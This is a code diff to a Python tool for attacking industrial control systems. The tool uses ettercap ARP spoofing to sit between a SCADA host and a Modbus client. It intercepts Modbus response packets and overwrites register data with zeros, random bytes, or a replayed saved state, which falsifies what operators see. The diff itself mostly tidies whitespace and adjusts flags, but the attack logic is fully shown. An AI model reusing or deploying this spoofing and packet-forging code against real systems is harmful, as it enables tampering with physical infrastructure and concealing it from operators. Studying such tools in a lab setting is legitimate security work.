@@ -65,7 +65,7 @@ def etterspoof():
         intrfce = input("Enter Interface Name: ") 
         time.sleep(2)
 
-        cmd = ["ettercap", "-Tq", "-i", intrfce, "-M", f"arp:remote", f"{nm_config.scada_mac}/{nm_config.scada_ip}//", f"{nm_config.modcli_mac}/{nm_config.modcli_ip}//"]
+        cmd = ["ettercap", "-TqD", "-i", intrfce, "-M", f"arp:remote", f"{nm_config.scada_mac}/{nm_config.scada_ip}//", f"{nm_config.modcli_mac}/{nm_config.modcli_ip}//"]
         print(f"Executing: {' '.join(cmd)}")
         subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, start_new_session=True)
         time.sleep(5)
@@ -173,28 +173,18 @@ def fool():
         
             
             pkt = IP(packet.get_payload())
-            
             if pkt.haslayer(Raw):
-            
                 clear()
-                
                 print("Modbus Response Packet Intercepted")
-                
                 hexdump(pkt)
-                
                 bytecnt = pkt[Raw].load[8]
-                
                 data = pkt[Raw].load[:9] + int(bytecnt/2)*b'\x00\x00'
-                
                 pkt[Raw].load = data
-                
                 print("Registers cleared")
                 hexdump(pkt)
-                
                 del pkt[IP].len
                 del pkt[IP].chksum
                 del pkt[TCP].chksum
-            
             packet.drop()
             send(pkt)
             
@@ -222,28 +212,18 @@ def fool():
         
             
             pkt = IP(packet.get_payload())
-            
             if pkt.haslayer(Raw):
-            
                 clear()
-                
                 print("Modbus Response Packet Intercepted")
-                
-                hexdump(pkt)
-                
+                hexdump(pkt)    
                 bytecnt = pkt[Raw].load[8]
-                
                 data = pkt[Raw].load[:9] + int(bytecnt) * os.urandom(1)
-                
                 pkt[Raw].load = data
-                
                 print("Registers cleared")
                 hexdump(pkt)
-                
                 del pkt[IP].len
                 del pkt[IP].chksum
                 del pkt[TCP].chksum
-            
             packet.drop()
             send(pkt)
             
@@ -265,28 +245,18 @@ def fool():
             nfqueue.bind(0, callback)
 
     def preserve():
-    
         def init():
-        
             global cflag
             cflag = "0"
-
             def pull(packet):
-                
                 print("Modbus Packet Intercepted")
-                    
                 hexdump(packet)
-                
                 if packet.haslayer(Raw):
-                    
                     print("Modbus Raw Layer Intercepted, Storing...")
-                    
                     global coildata
                     coildata = packet[Raw].load[9:]
-                    
                     global cflag
                     cflag = "0"
-                     
                     print(coildata)
                     
                     
@@ -297,28 +267,18 @@ def fool():
         
             
             pkt = IP(packet.get_payload())
-            
             if pkt.haslayer(Raw):
-            
                 clear()
-                
                 print("Modbus Response Packet Intercepted")
-                
                 hexdump(pkt)
-                
                 bytecnt = pkt[Raw].load[8]
-                
                 data = pkt[Raw].load[:9] + coildata
-                
                 pkt[Raw].load = data
-                
                 print("Registers mimic saved state")
                 hexdump(pkt)
-                
                 del pkt[IP].len
                 del pkt[IP].chksum
                 del pkt[TCP].chksum
-            
             packet.drop()
             send(pkt)
             
@@ -439,8 +399,6 @@ modified by Jesse Cutshall
 
         time.sleep(0.5)
         
-        pycheck()
-        
         print("Select a function from the options below\n")
         print("1) Write to Coils/Holding Registers")
         print("2) Fool SCADA ")
@@ -480,4 +438,5 @@ modified by Jesse Cutshall
             sys.exit(0)
 
 if __name__ == "__main__":
+    pycheck()
     main()
